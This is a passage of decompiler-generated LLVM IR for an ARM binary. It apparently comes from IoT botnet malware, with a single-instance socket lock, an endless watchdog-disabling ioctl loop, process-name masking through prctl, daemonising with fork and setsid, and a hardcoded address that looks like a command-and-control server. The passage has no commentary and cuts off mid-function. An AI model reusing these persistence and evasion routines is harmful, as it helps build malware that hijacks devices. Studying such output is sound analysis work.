  %v2_ecc0 = icmp eq i32 %v3_ecb8, -1
  store i32 %v3_ecb8, i32* @global_var_1a394.129, align 4
  br i1 %v2_ecc0, label %dec_label_pc_ed80, label %dec_label_pc_eccc

dec_label_pc_eccc:                                ; preds = %dec_label_pc_ec9c
  %v0_ecd0 = load i32, i32* %r4.global-to-local, align 4
  %v6_ece0 = call i32 @setsockopt(i32 %v3_ecb8, i32 %v0_ecd0, i32 2, i32* nonnull %stack_var_-28, i32 4)
  %v2_ece4 = load i32, i32* @global_var_1a394.129, align 4
  store i32 %v2_ece4, i32* %r4.global-to-local, align 4
  %v2_ecf4 = call i32 (i32, i32, ...) @fcntl(i32 %v2_ece4, i32 3)
  %v2_ed04 = call i32 (i32, i32, ...) @fcntl(i32 %v2_ece4, i32 4)
  store i32 ptrtoint (i8** @global_var_1a3a0.131 to i32), i32* @r8, align 4
  %v2_ed0c = load i8, i8* bitcast (i8** @global_var_1a3a0.131 to i8*), align 4
  %v2_ed10 = icmp eq i8 %v2_ed0c, 0
  br i1 %v2_ed10, label %.thread2, label %.thread

.thread2:                                         ; preds = %dec_label_pc_eccc
  br label %bb

.thread:                                          ; preds = %dec_label_pc_eccc
  br label %bb

bb:                                               ; preds = %.thread2, %.thread
  store i32 0, i32* @r5, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v0_ed48 = call i32* @__errno_location()
  %v2_ed48 = ptrtoint i32* %v0_ed48 to i32
  %v0_ed4c = load i32, i32* @r5, align 4
  store i32 %v0_ed4c, i32* %v0_ed48, align 4
  %v2_ed50 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_ed50, i32* @r7, align 4
  store i32 %v2_ed48, i32* %r4.global-to-local, align 4
  %tmp21 = bitcast i32* %stack_var_-44 to %sockaddr*
  %v2_ed5c = load i32, i32* @global_var_1a394.129, align 4
  %v5_ed64 = call i32 @bind(i32 %v2_ed5c, %sockaddr* %tmp21, i32 16)
  %v2_ed68 = icmp eq i32 %v5_ed64, -1
  br i1 %v2_ed68, label %dec_label_pc_ed88, label %dec_label_pc_ed70

dec_label_pc_ed70:                                ; preds = %bb
  %v2_ed78 = load i32, i32* @global_var_1a394.129, align 4
  %v2_ed7c = call i32 @listen(i32 %v2_ed78, i32 1)
  br label %dec_label_pc_ed80

dec_label_pc_ed80:                                ; preds = %dec_label_pc_ec9c, %dec_label_pc_ed94, %dec_label_pc_ed70
  %v20_ed84 = phi i32 [ -1, %dec_label_pc_ec9c ], [ %v1_ede4, %dec_label_pc_ed94 ], [ %v2_ed7c, %dec_label_pc_ed70 ]
  store i32 %v3_ec9c, i32* @r4, align 4
  store i32 %v9_ec9c, i32* @r6, align 4
  store i32 %v12_ec9c, i32* @r7, align 4
  store i32 %v15_ec9c, i32* @r8, align 4
  ret i32 %v20_ed84

dec_label_pc_ed88:                                ; preds = %bb
  %v0_ed88 = load i32, i32* %r4.global-to-local, align 4
  %v1_ed88 = inttoptr i32 %v0_ed88 to i32*
  %v2_ed88 = load i32, i32* %v1_ed88, align 4
  %v7_ed8c = icmp eq i32 %v2_ed88, 99
  br i1 %v7_ed8c, label %dec_label_pc_edec, label %dec_label_pc_ed94

dec_label_pc_ed94:                                ; preds = %dec_label_pc_edec, %bb22, %dec_label_pc_ed88
  store i32 0, i32* @r4, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v2_edac = load i32, i32* @global_var_1a394.129, align 4
  %v5_edc4 = call i32 @connect(i32 %v2_edac, %sockaddr* %tmp21, i32 16)
  %v1_edcc = call i32 @sleep(i32 5)
  %v2_edd0 = load i32, i32* @global_var_1a394.129, align 4
  %v1_edd4 = call i32 @close(i32 %v2_edd0)
  %v1_ede0 = call i32 @function_df00(i32 9510)
  %v1_ede4 = call i32 @function_ec9c(i32 %v1_ede0)
  br label %dec_label_pc_ed80

dec_label_pc_edec:                                ; preds = %dec_label_pc_ed88
  %v2_edec = load i8, i8* bitcast (i8** @global_var_1a3a0.131 to i8*), align 4
  %v3_edec = zext i8 %v2_edec to i32
  %v1_edf0 = load i32, i32* @r5, align 4
  %v9_edf0 = icmp eq i32 %v3_edec, %v1_edf0
  br i1 %v9_edf0, label %dec_label_pc_ed94, label %bb22

bb22:                                             ; preds = %dec_label_pc_edec
  %v2_edf8 = trunc i32 %v1_edf0 to i8
  store i8 %v2_edf8, i8* bitcast (i8** @global_var_1a3a0.131 to i8*), align 4
  br label %dec_label_pc_ed94

; uselistorder directives
  uselistorder i32* %stack_var_-44, { 1, 0, 3, 2 }
  uselistorder i32 (i32)* @function_df00, { 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @listen, { 6, 5, 2, 3, 4, 0, 1, 7 }
  uselistorder i32 (i32, %sockaddr*, i32)* @bind, { 8, 6, 5, 2, 1, 0, 4, 3, 7, 9 }
  uselistorder i8* bitcast (i8** @global_var_1a3a0.131 to i8*), { 0, 2, 1 }
  uselistorder i8** @global_var_1a3a0.131, { 1, 0 }
  uselistorder label %dec_label_pc_ed94, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ed80, { 1, 2, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @function_ee0c() local_unnamed_addr {
dec_label_pc_ee0c:
  %stack_var_-8 = alloca i32, align 4
  %v3_ee0c = load i32, i32* @r4, align 4
  store i32 %v3_ee0c, i32* %stack_var_-8, align 4
  %v1_ee14 = call i32 @function_1134c(i32 1)
  %v3_ee1c = call i32 @inet_addr(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_1202c.134, i32 0, i32 0))
  store i32 %v3_ee1c, i32* @global_var_1a430.137, align 4
  %v3_ee30 = call i32 @function_11268(i32 1, i32* null)
  %v4_ee30 = inttoptr i32 %v3_ee30 to i8*
  %v2_ee34 = add i32 %v3_ee30, 1
  %v3_ee34 = inttoptr i32 %v2_ee34 to i8*
  %v4_ee34 = load i8, i8* %v3_ee34, align 1
  %v3_ee38 = load i8, i8* %v4_ee30, align 1
  store i8 %v4_ee34, i8* bitcast (i32* @global_var_1a42f.138 to i8*), align 4
  store i8 %v3_ee38, i8* bitcast (i32* @global_var_1a42e.139 to i8*), align 4
  %v2_ee50 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_ee50, i32* @r4, align 4
  %v1_ee54 = call i32 @function_11294(i32 1)
  %v0_ee58 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_ee58, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_ee0c
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_ee0c, %bb
  ret i32 %v1_ee54

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_ee60(i32 %arg1) local_unnamed_addr {
dec_label_pc_ee60:
  %v3_ee60 = load i32, i32* @r4, align 4
  %v6_ee60 = load i32, i32* @r5, align 4
  %v0_ee68 = call i32 @fork()
  %v2_ee6c = icmp eq i32 %v0_ee68, -1
  %. = zext i1 %v2_ee6c to i32
  %tmp10 = icmp slt i32 %v0_ee68, 1
  %storemerge4 = select i1 %tmp10, i32 %., i32 1
  store i32 %storemerge4, i32* @r5, align 4
  %v2_ee88 = icmp eq i32 %storemerge4, 0
  store i32 %v0_ee68, i32* @global_var_1a3d0.141, align 4
  br i1 %v2_ee88, label %dec_label_pc_ee9c, label %dec_label_pc_ee94

dec_label_pc_ee94:                                ; preds = %dec_label_pc_ee60
  store i32 %v3_ee60, i32* @r4, align 4
  store i32 %v6_ee60, i32* @r5, align 4
  ret i32 %v0_ee68

dec_label_pc_ee9c:                                ; preds = %dec_label_pc_ee60
  %v1_eea8 = call i32 @function_1134c(i32 23)
  %v1_eeb0 = call i32 @function_1134c(i32 24)
  %v0_eeb4 = load i32, i32* @r5, align 4
  %v2_eebc = inttoptr i32 %v0_eeb4 to i32*
  %v3_eebc = call i32 @function_11268(i32 23, i32* %v2_eebc)
  %v4_eebc = inttoptr i32 %v3_eebc to i8*
  %v4_eec4 = call i32 (i8*, i32, ...) @open(i8* %v4_eebc, i32 2)
  %v2_eec8 = icmp eq i32 %v4_eec4, -1
  store i32 %v4_eec4, i32* @r4, align 4
  br i1 %v2_eec8, label %dec_label_pc_ef10, label %dec_label_pc_eed4

dec_label_pc_eed4:                                ; preds = %dec_label_pc_ef10, %dec_label_pc_ee9c
  %v0_eee0 = phi i32 [ %v5_ef20, %dec_label_pc_ef10 ], [ %v4_eec4, %dec_label_pc_ee9c ]
  %v2_eee8 = call i32 (i32, i32, ...) @ioctl(i32 %v0_eee0, i32 -2147199228)
  br label %dec_label_pc_eeec

dec_label_pc_eeec:                                ; preds = %dec_label_pc_eeec, %dec_label_pc_eed4
  %v0_eef8 = load i32, i32* @r4, align 4
  %v2_ef00 = call i32 (i32, i32, ...) @ioctl(i32 %v0_eef8, i32 -2147199227)
  %v1_ef08 = call i32 @sleep(i32 10)
  br label %dec_label_pc_eeec

dec_label_pc_ef10:                                ; preds = %dec_label_pc_ee9c
  %v0_ef10 = load i32, i32* @r5, align 4
  %v2_ef18 = inttoptr i32 %v0_ef10 to i32*
  %v3_ef18 = call i32 @function_11268(i32 24, i32* %v2_ef18)
  %v4_ef18 = inttoptr i32 %v3_ef18 to i8*
  %v5_ef20 = call i32 (i8*, i32, ...) @open(i8* %v4_ef18, i32 2)
  %v3_ef24 = icmp eq i32 %v5_ef20, -1
  store i32 %v5_ef20, i32* @r4, align 4
  br i1 %v3_ef24, label %dec_label_pc_ef30, label %dec_label_pc_eed4

dec_label_pc_ef30:                                ; preds = %dec_label_pc_ef10
  %v1_ef34 = call i32 @function_11294(i32 23)
  %v1_ef3c = call i32 @function_11294(i32 24)
  %v0_ef40 = load i32, i32* @r5, align 4
  call void @exit(i32 %v0_ef40)
  unreachable

; uselistorder directives
  uselistorder i32 %v5_ef20, { 1, 2, 0 }
  uselistorder i32 %storemerge4, { 1, 0 }
  uselistorder i32 %v0_ee68, { 2, 0, 1, 3 }
  uselistorder i32 (i32, i32, ...)* @ioctl, { 1, 0, 2 }
  uselistorder i32 (i8*, i32, ...)* @open, { 3, 2, 1, 0, 6, 5, 4, 7 }
}

define i32 @function_ef4c(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_ef4c:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-38 = alloca i8*, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-380 = alloca i32, align 4
  %stack_var_-252 = alloca i32, align 4
  %stack_var_-1532 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-124 = alloca i32, align 4
  %stack_var_-508 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_ef4c = load i32, i32* @r4, align 4
  store i32 %v3_ef4c, i32* %stack_var_-36, align 4
  %v6_ef4c = load i32, i32* @r5, align 4
  %v9_ef4c = load i32, i32* @r6, align 4
  %v15_ef4c = load i32, i32* @r8, align 4
  %v2_ef58 = ptrtoint i32* %stack_var_-508 to i32
  store i32 %v2_ef58, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  %tmp41 = bitcast i32* %stack_var_-508 to %_TYPEDEF_sigset_t*
  store i32 %tmp, i32* @r8, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v3_ef70 = call i32 @sigemptyset(%_TYPEDEF_sigset_t* %tmp41)
  %v4_ef7c = call i32 @sigaddset(%_TYPEDEF_sigset_t* %tmp41, i32 2)
  %v0_ef80 = load i32, i32* @r5, align 4
  %v1_ef80 = inttoptr i32 %v0_ef80 to %_TYPEDEF_sigset_t*
  store i32 %v0_ef80, i32* %r2.global-to-local, align 4
  %v7_ef8c = call i32 @sigprocmask(i32 %v0_ef80, %_TYPEDEF_sigset_t* %tmp41, %_TYPEDEF_sigset_t* %v1_ef80)
  %v4_ef98 = call void (i32)* @signal(i32 17, void (i32)* inttoptr (i32 1 to void (i32)*))
  %v4_efa4 = call void (i32)* @signal(i32 5, void (i32)* bitcast (void (i32)** @global_var_ec84.143 to void (i32)*))
  %v0_efa8 = call i32 @function_11a50()
  store i32 %v0_efa8, i32* @global_var_1a420.104, align 4
  store i32 1494907824, i32* %r2.global-to-local, align 4
  store i8 23, i8* bitcast (i32* @global_var_1a42f.138 to i8*), align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i8 2, i8* bitcast (%sockaddr** @global_var_1a42c.136 to i8*), align 4
  store i32 1494907824, i32* @global_var_1a430.137, align 4
  %v0_efd0 = load i32, i32* @r5, align 4
  %v1_efd0 = trunc i32 %v0_efd0 to i8
  store i8 %v1_efd0, i8* bitcast (i32* @global_var_1a42e.139 to i8*), align 4
  store i8 %v1_efd0, i8* bitcast (i32* @global_var_1a42d.147 to i8*), align 4
  %v6_efd8 = call i32 @function_11404(i32 %v0_efa8, i32 ptrtoint (%sockaddr** @global_var_1a42c.136 to i32), i32 1494907824, i32 2)
  store i32 ptrtoint (i32* @global_var_ee0c.125 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_ee0c.125 to i32), i32* @global_var_1a39c.127, align 4
  %v1_efe8 = call i32 @function_ec9c(i32 %v6_efd8)
  %v1_efec = call i32 @function_f6d4(i32 %v1_efe8)
  %v2_eff4 = ptrtoint i32* %stack_var_-124 to i32
  store i32 %v2_eff4, i32* @r0, align 4
  store i32 32, i32* @r1, align 4
  %v0_effc = call i32 @function_11838()
  %v0_f000 = load i32, i32* @r6, align 4
  %v7_f000 = icmp eq i32 %v0_f000, 2
  br i1 %v7_f000, label %dec_label_pc_f128, label %dec_label_pc_f008

dec_label_pc_f008:                                ; preds = %dec_label_pc_f128, %dec_label_pc_ef4c, %dec_label_pc_f138
  %v0_f008 = call i32 @function_f67c()
  store i32 %v0_f008, i32* %r6.global-to-local, align 4
  %v0_f010 = load i32, i32* @r8, align 4
  %v1_f010 = inttoptr i32 %v0_f010 to i32*
  %v2_f010 = load i32, i32* %v1_f010, align 4
  %v1_f014 = inttoptr i32 %v2_f010 to i8*
  %v2_f014 = call i32 @function_11798(i8* %v1_f014)
  store i32 %v2_f014, i32* %r4.global-to-local, align 4
  %v0_f01c = load i32, i32* @r8, align 4
  %v1_f01c = inttoptr i32 %v0_f01c to i32*
  %v2_f01c = load i32, i32* %v1_f01c, align 4
  %v1_f020 = inttoptr i32 %v2_f01c to i8*
  %v2_f020 = call i32 @function_11798(i8* %v1_f020)
  %v1_f024 = sub i32 20, %v2_f014
  store i32 %v2_f020, i32* @r5, align 4
  %v0_f02c = load i32, i32* %r6.global-to-local, align 4
  %v2_f030 = urem i32 %v0_f02c, %v1_f024
  %v2_f038 = add i32 %v2_f030, %v2_f020
  store i32 %v2_f038, i32* @r4, align 4
  %v2_f03c = ptrtoint i32* %stack_var_-92 to i32
  store i32 %v2_f03c, i32* @r6, align 4
  %v2_f048 = call i32 @function_f730(i32 %v2_f03c, i32 %v2_f038)
  %v2_f04c = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_f04c, i32* %r2.global-to-local, align 4
  %v1_f050 = load i32, i32* @r4, align 4
  %v2_f050 = add i32 %v1_f050, %v2_f04c
  store i32 %v2_f050, i32* %r3.global-to-local, align 4
  store i32 0, i32* @sb, align 4
  %v0_f05c = load i32, i32* @r8, align 4
  %v1_f05c = inttoptr i32 %v0_f05c to i32*
  %v2_f05c = load i32, i32* %v1_f05c, align 4
  store i32 %v2_f05c, i32* @r0, align 4
  %v3_f060 = add i32 %v2_f050, -56
  %v4_f060 = inttoptr i32 %v3_f060 to i8*
  store i8 0, i8* %v4_f060, align 1
  %v2_f064 = inttoptr i32 %v2_f05c to i8*
  %v3_f064 = call i32 @function_117c0(i8* %v2_f064, i32 %v2_f03c)
  store i32 32, i32* @r1, align 4
  store i32 %v2_f03c, i32* @r0, align 4
  %v0_f070 = call i32 @function_11838()
  %v0_f074 = call i32 @function_f67c()
  store i32 %v0_f074, i32* @r7, align 4
  %v0_f07c = load i32, i32* @r8, align 4
  %v1_f07c = inttoptr i32 %v0_f07c to i32*
  %v2_f07c = load i32, i32* %v1_f07c, align 4
  %v1_f080 = inttoptr i32 %v2_f07c to i8*
  %v2_f080 = call i32 @function_11798(i8* %v1_f080)
  store i32 %v2_f080, i32* %r4.global-to-local, align 4
  %v0_f088 = load i32, i32* @r8, align 4
  %v1_f088 = inttoptr i32 %v0_f088 to i32*
  %v2_f088 = load i32, i32* %v1_f088, align 4
  %v1_f08c = inttoptr i32 %v2_f088 to i8*
  %v2_f08c = call i32 @function_11798(i8* %v1_f08c)
  %v1_f090 = sub i32 20, %v2_f080
  store i32 %v2_f08c, i32* @r5, align 4
  %v0_f098 = load i32, i32* @r7, align 4
  %v2_f09c = urem i32 %v0_f098, %v1_f090
  %v2_f0a0 = add i32 %v2_f09c, %v2_f08c
  store i32 %v2_f0a0, i32* @r4, align 4
  %v2_f0ac = call i32 @function_f730(i32 %v2_f03c, i32 %v2_f0a0)
  %v1_f0b4 = load i32, i32* @r4, align 4
  %v2_f0b4 = add i32 %v1_f0b4, %v2_f04c
  store i32 %v2_f0b4, i32* %r3.global-to-local, align 4
  %v0_f0b8 = load i32, i32* @sb, align 4
  %v1_f0b8 = trunc i32 %v0_f0b8 to i8
  %v3_f0b8 = add i32 %v2_f0b4, -56
  %v4_f0b8 = inttoptr i32 %v3_f0b8 to i8*
  store i8 %v1_f0b8, i8* %v4_f0b8, align 1
  %v5_f0c4 = call i32 @prctl(i32 15, i32 %v2_f03c, i32 %v2_f0b4, i32 %v2_f0b4, i32 ptrtoint (i32* @0 to i32))
  %v1_f0cc = call i32 @function_1134c(i32 3)
  %v3_f0d8 = call i32 @function_11268(i32 3, i32* nonnull %stack_var_-52)
  %v3_f0dc = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_f0dc, i32* %r2.global-to-local, align 4
  %v3_f0e8 = inttoptr i32 %v3_f0d8 to i32*
  %v4_f0e8 = call i32 @write(i32 1, i32* %v3_f0e8, i32 %v3_f0dc)
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_f0f8 = call i32 @write(i32 ptrtoint (i32* @global_var_1203c.151 to i32), i32* inttoptr (i32 1 to i32*), i32 1)
  %v1_f100 = call i32 @function_11294(i32 3)
  %v1_f104 = call i32 @function_934c(i32 %v1_f100)
  %v1_f108 = call i32 @function_e49c(i32 %v1_f104)
  %v1_f10c = call i32 @function_ee60(i32 %v1_f108)
  %v0_f110 = call i32 @fork()
  %v1_f114 = load i32, i32* @sb, align 4
  %v7_f118 = icmp sgt i32 %v0_f110, %v1_f114
  br i1 %v7_f118, label %dec_label_pc_f11c, label %dec_label_pc_f164

dec_label_pc_f11c:                                ; preds = %dec_label_pc_f008
  %v2_f124 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_f124, i32* %r4.global-to-local, align 4
  store i32 %v6_ef4c, i32* %r5.global-to-local, align 4
  store i32 %v9_ef4c, i32* %r6.global-to-local, align 4
  store i32 %v15_ef4c, i32* %r8.global-to-local, align 4
  ret i32 0

dec_label_pc_f128:                                ; preds = %dec_label_pc_ef4c
  %v0_f128 = load i32, i32* @r8, align 4
  %v1_f128 = add i32 %v0_f128, 4
  %v2_f128 = inttoptr i32 %v1_f128 to i32*
  %v3_f128 = load i32, i32* %v2_f128, align 4
  %v1_f12c = inttoptr i32 %v3_f128 to i8*
  %v2_f12c = call i32 @function_11798(i8* %v1_f12c)
  %v8_f134 = icmp sgt i32 %v2_f12c, 31
  br i1 %v8_f134, label %dec_label_pc_f008, label %dec_label_pc_f138

dec_label_pc_f138:                                ; preds = %dec_label_pc_f128
  %v0_f13c = load i32, i32* @r8, align 4
  %v1_f13c = add i32 %v0_f13c, 4
  %v2_f13c = inttoptr i32 %v1_f13c to i32*
  %v3_f13c = load i32, i32* %v2_f13c, align 4
  store i32 %v2_eff4, i32* @r0, align 4
  %v2_f144 = bitcast i32* %stack_var_-124 to i8*
  %v3_f144 = call i32 @function_117c0(i8* %v2_f144, i32 %v3_f13c)
  %v0_f148 = load i32, i32* @r8, align 4
  %v1_f148 = add i32 %v0_f148, 4
  %v2_f148 = inttoptr i32 %v1_f148 to i32*
  %v3_f148 = load i32, i32* %v2_f148, align 4
  store i32 %v3_f148, i32* %r4.global-to-local, align 4
  %v1_f150 = inttoptr i32 %v3_f148 to i8*
  %v2_f150 = call i32 @function_11798(i8* %v1_f150)
  store i32 %v2_f150, i32* @r1, align 4
  store i32 %v3_f148, i32* @r0, align 4
  %v0_f15c = call i32 @function_11838()
  br label %dec_label_pc_f008

dec_label_pc_f164:                                ; preds = %dec_label_pc_f008
  %v1_f164 = call i32 @setsid()
  %v0_f168 = load i32, i32* @sb, align 4
  %v1_f16c = call i32 @close(i32 %v0_f168)
  %v1_f174 = call i32 @close(i32 1)
  %v1_f17c = call i32 @close(i32 2)
  %v1_f180 = call i32 @function_934c(i32 %v1_f17c)
  %v1_f184 = call i32 @function_e49c(i32 %v1_f180)
  %v1_f188 = call i32 @function_ee60(i32 %v1_f184)
  %v1_f18c = call i32 @function_fb58(i32 %v1_f188)
  %v2_f194 = ptrtoint i32* %stack_var_-1532 to i32
  store i32 %v2_f194, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a398.154 to i32), i32* @sl, align 4
  %v2_f1ac = ptrtoint i32* %stack_var_-252 to i32
  store i32 %v2_f1ac, i32* @r6, align 4
  %v2_f1b0 = ptrtoint i32* %stack_var_-380 to i32
  store i32 %v2_f1b0, i32* @r7, align 4
  %tmp42 = bitcast i32* %stack_var_-252 to %_TYPEDEF_fd_set*
  %tmp43 = bitcast i32* %stack_var_-380 to %_TYPEDEF_fd_set*
  %tmp44 = bitcast i32* %stack_var_-60 to %timeval*
  %v7_f538 = bitcast i8** %stack_var_-38 to i32*
  %v2_f4d0 = ptrtoint i32* %stack_var_-44 to i32
  %v1_f548 = bitcast i32* %stack_var_-124 to i8*
  br label %dec_label_pc_f1b4

dec_label_pc_f1b4:                                ; preds = %dec_label_pc_f1b4.backedge, %dec_label_pc_f164
  %v2_f1bc49 = phi i32 [ %v2_f1bc49.pre, %dec_label_pc_f1b4.backedge ], [ %v2_f1ac, %dec_label_pc_f164 ]
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v4_f1bc51 = inttoptr i32 %v2_f1bc49 to i32*
  store i32 0, i32* %v4_f1bc51, align 4
  %v0_f1c052 = load i32, i32* %r3.global-to-local, align 4
  %v1_f1c053 = add i32 %v0_f1c052, 4
  store i32 %v1_f1c053, i32* %r3.global-to-local, align 4
  %v7_f1c454 = icmp eq i32 %v1_f1c053, 128
  br i1 %v7_f1c454, label %dec_label_pc_f1cc, label %dec_label_pc_f1bc.dec_label_pc_f1bc_crit_edge

dec_label_pc_f1bc.dec_label_pc_f1bc_crit_edge:    ; preds = %dec_label_pc_f1b4, %dec_label_pc_f1bc.dec_label_pc_f1bc_crit_edge
  %v1_f1c055 = phi i32 [ %v1_f1c0, %dec_label_pc_f1bc.dec_label_pc_f1bc_crit_edge ], [ %v1_f1c053, %dec_label_pc_f1b4 ]
  %v0_f1bc.pre = load i32, i32* %r2.global-to-local, align 4
  %v2_f1bc = load i32, i32* @r6, align 4
  %v3_f1bc = add i32 %v2_f1bc, %v1_f1c055
  %v4_f1bc = inttoptr i32 %v3_f1bc to i32*
  store i32 %v0_f1bc.pre, i32* %v4_f1bc, align 4
  %v0_f1c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_f1c0 = add i32 %v0_f1c0, 4
  store i32 %v1_f1c0, i32* %r3.global-to-local, align 4
  %v7_f1c4 = icmp eq i32 %v1_f1c0, 128
  br i1 %v7_f1c4, label %dec_label_pc_f1cc, label %dec_label_pc_f1bc.dec_label_pc_f1bc_crit_edge

dec_label_pc_f1cc:                                ; preds = %dec_label_pc_f1bc.dec_label_pc_f1bc_crit_edge, %dec_label_pc_f1b4
  %v0_f1cc = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_f1cc, i32* %r3.global-to-local, align 4
  store i32 %v0_f1cc, i32* %r4.global-to-local, align 4
  %v2_f1d456 = load i32, i32* @r7, align 4
  %v3_f1d457 = add i32 %v2_f1d456, %v0_f1cc
  %v4_f1d458 = inttoptr i32 %v3_f1d457 to i32*
  store i32 %v0_f1cc, i32* %v4_f1d458, align 4
  %v0_f1d859 = load i32, i32* %r3.global-to-local, align 4
  %v1_f1d860 = add i32 %v0_f1d859, 4
  store i32 %v1_f1d860, i32* %r3.global-to-local, align 4
  %v7_f1dc61 = icmp eq i32 %v1_f1d860, 128
  br i1 %v7_f1dc61, label %dec_label_pc_f1e4, label %dec_label_pc_f1d4.dec_label_pc_f1d4_crit_edge

dec_label_pc_f1d4.dec_label_pc_f1d4_crit_edge:    ; preds = %dec_label_pc_f1cc, %dec_label_pc_f1d4.dec_label_pc_f1d4_crit_edge
  %v1_f1d862 = phi i32 [ %v1_f1d8, %dec_label_pc_f1d4.dec_label_pc_f1d4_crit_edge ], [ %v1_f1d860, %dec_label_pc_f1cc ]
  %v0_f1d4.pre = load i32, i32* %r4.global-to-local, align 4
  %v2_f1d4 = load i32, i32* @r7, align 4
  %v3_f1d4 = add i32 %v2_f1d4, %v1_f1d862
  %v4_f1d4 = inttoptr i32 %v3_f1d4 to i32*
  store i32 %v0_f1d4.pre, i32* %v4_f1d4, align 4
  %v0_f1d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_f1d8 = add i32 %v0_f1d8, 4
  store i32 %v1_f1d8, i32* %r3.global-to-local, align 4
  %v7_f1dc = icmp eq i32 %v1_f1d8, 128
  br i1 %v7_f1dc, label %dec_label_pc_f1e4, label %dec_label_pc_f1d4.dec_label_pc_f1d4_crit_edge

dec_label_pc_f1e4:                                ; preds = %dec_label_pc_f1d4.dec_label_pc_f1d4_crit_edge, %dec_label_pc_f1cc
  %v2_f1e4 = load i32, i32* @global_var_1a394.129, align 4
  %v2_f1e8 = icmp eq i32 %v2_f1e4, -1
  br i1 %v2_f1e8, label %dec_label_pc_f214, label %dec_label_pc_f1f0

dec_label_pc_f1f0:                                ; preds = %dec_label_pc_f1e4
  %v3_f1f0 = udiv i32 %v2_f1e4, 32
  %v3_f1f4 = mul nuw nsw i32 %v3_f1f0, 4
  %v2_f1fc = add i32 %v3_f1f4, %v2_f04c
  store i32 %v2_f1fc, i32* %r3.global-to-local, align 4
  %v1_f200 = add i32 %v2_f1fc, -216
  %v2_f200 = inttoptr i32 %v1_f200 to i32*
  %v3_f200 = load i32, i32* %v2_f200, align 4
  %v1_f204 = urem i32 %v2_f1e4, 32
  %v7_f20c = shl i32 1, %v1_f204
  %v8_f20c = or i32 %v3_f200, %v7_f20c
  store i32 %v8_f20c, i32* %r2.global-to-local, align 4
  store i32 %v8_f20c, i32* %v2_f200, align 4
  br label %dec_label_pc_f214

dec_label_pc_f214:                                ; preds = %dec_label_pc_f1e4, %dec_label_pc_f1f0
  %v2_f214 = load i32, i32* @global_var_1a398.154, align 4
  store i32 %v2_f214, i32* %r3.global-to-local, align 4
  %v2_f218 = icmp eq i32 %v2_f214, -1
  store i32 ptrtoint (i32* @global_var_1a398.154 to i32), i32* %r8.global-to-local, align 4
  br i1 %v2_f218, label %dec_label_pc_f450, label %dec_label_pc_f224

dec_label_pc_f224:                                ; preds = %dec_label_pc_f450, %dec_label_pc_f214, %.thread
  store i32 ptrtoint (i8** @global_var_1a3d4.156 to i32), i32* %r2.global-to-local, align 4
  %v2_f228 = load i8, i8* bitcast (i8** @global_var_1a3d4.156 to i8*), align 4
  %v2_f22c = icmp eq i8 %v2_f228, 0
  %v2_f334 = load i32, i32* @global_var_1a398.154, align 4
  %v3_f338 = udiv i32 %v2_f334, 32
  store i32 %v3_f338, i32* %r3.global-to-local, align 4
  br i1 %v2_f22c, label %dec_label_pc_f334, label %dec_label_pc_f234

dec_label_pc_f234:                                ; preds = %dec_label_pc_f224
  %v3_f23c = mul nuw nsw i32 %v3_f338, 4
  %v2_f244 = add i32 %v3_f23c, %v2_f04c
  store i32 %v2_f244, i32* %r3.global-to-local, align 4
  %v1_f248 = add i32 %v2_f244, -344
  %v2_f248 = inttoptr i32 %v1_f248 to i32*
  %v3_f248 = load i32, i32* %v2_f248, align 4
  %v1_f24c = urem i32 %v2_f334, 32
  %v7_f254 = shl i32 1, %v1_f24c
  %v8_f254 = or i32 %v3_f248, %v7_f254
  store i32 %v8_f254, i32* %r2.global-to-local, align 4
  store i32 %v8_f254, i32* %v2_f248, align 4
  br label %dec_label_pc_f25c

dec_label_pc_f25c:                                ; preds = %dec_label_pc_f334, %dec_label_pc_f234
  %v2_f25c = load i32, i32* @global_var_1a394.129, align 4
  %v2_f260 = load i32, i32* @global_var_1a398.154, align 4
  store i32 %v2_f260, i32* %r3.global-to-local, align 4
  %v5_f26c = icmp slt i32 %v2_f25c, %v2_f260
  br i1 %v5_f26c, label %bb, label %bb46

bb:                                               ; preds = %dec_label_pc_f25c
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_f25c, %bb
  %v0_f284 = phi i32 [ %v2_f25c, %dec_label_pc_f25c ], [ %v2_f260, %bb ]
  store i32 10, i32* %stack_var_-60, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_f284 = add i32 %v0_f284, 1
  store i32 %v2_f1b0, i32* %r2.global-to-local, align 4
